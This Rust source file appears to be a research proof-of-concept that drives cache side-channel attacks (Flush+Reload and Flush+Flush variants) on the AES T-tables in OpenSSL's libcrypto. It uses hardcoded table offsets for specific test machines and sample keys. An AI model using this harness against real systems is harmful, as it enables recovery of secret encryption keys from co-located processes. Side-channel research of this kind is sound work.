#![feature(unsafe_block_in_unsafe_fn)]
#![deny(unsafe_op_in_unsafe_fn)]
use aes_t_tables::{attack_t_tables_poc, AESTTableParams};
use cache_utils::calibration::Threshold;
use flush_flush::naive::NaiveFlushAndFlush;
use flush_flush::{FFPrimitives, FlushAndFlush, SingleFlushAndFlush};
use flush_reload::naive::*;
use nix::sched::sched_setaffinity;
use nix::unistd::Pid;
use std::path::Path;

const KEY1: [u8; 32] = [0; 32];

const KEY2: [u8; 32] = [
    0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc,
    0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80,
];

// On cyber cobaye
// 00000000001cc480 r Te0
// 00000000001cc080 r Te1
// 00000000001cbc80 r Te2
// 00000000001cb880 r Te3
const TE_CYBER_COBAYE: [isize; 4] = [0x1cc480, 0x1cc080, 0x1cbc80, 0x1cb880];

const TE_CITRON_VERT: [isize; 4] = [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140];

fn main() {
    let openssl_path = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");

    let te = TE_CITRON_VERT;

    let mut side_channel_fr = NaiveFlushAndReload::new(
        Threshold {
            bucket_index: 220,
            miss_faster_than_hit: false,
        },
        NaiveFRPrimitives {},
    );
    let mut side_channel_naiveff = NaiveFlushAndFlush::new(
        Threshold {
            bucket_index: 202,
            miss_faster_than_hit: true,
        },
        FFPrimitives {},
    );

    for (index, key) in [KEY1, KEY2].iter().enumerate() {
        println!("AES attack with Naive F+R, key {}", index);
        unsafe {
            attack_t_tables_poc(
                &mut side_channel_fr,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: *key,
                    te: te, // adjust me (should be in decreasing order)
                    openssl_path: &openssl_path,
                },
                &format!("FR-{}", index),
            )
        };
        println!("AES attack with Naive F+F, key {}", index);
        unsafe {
            attack_t_tables_poc(
                &mut side_channel_naiveff,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: *key,
                    te: te, // adjust me (should be in decreasing order)
                    openssl_path: &openssl_path,
                },
                &format!("NFF-{}", index),
            )
        };
        println!("AES attack with Single F+F, key {}", index);
        {
            let mut side_channel_ff = SingleFlushAndFlush::new(
                FlushAndFlush::new_any_single_core(FFPrimitives {})
                    .unwrap()
                    .0,
            );
            unsafe {
                attack_t_tables_poc(
                    &mut side_channel_ff,
                    AESTTableParams {
                        num_encryptions: 1 << 12,
                        key: *key,
                        te: te, // adjust me (should be in decreasing order)
                        openssl_path: &openssl_path,
                    },
                    &format!("BFF-{}", index),
                )
            };
        }
    }
}
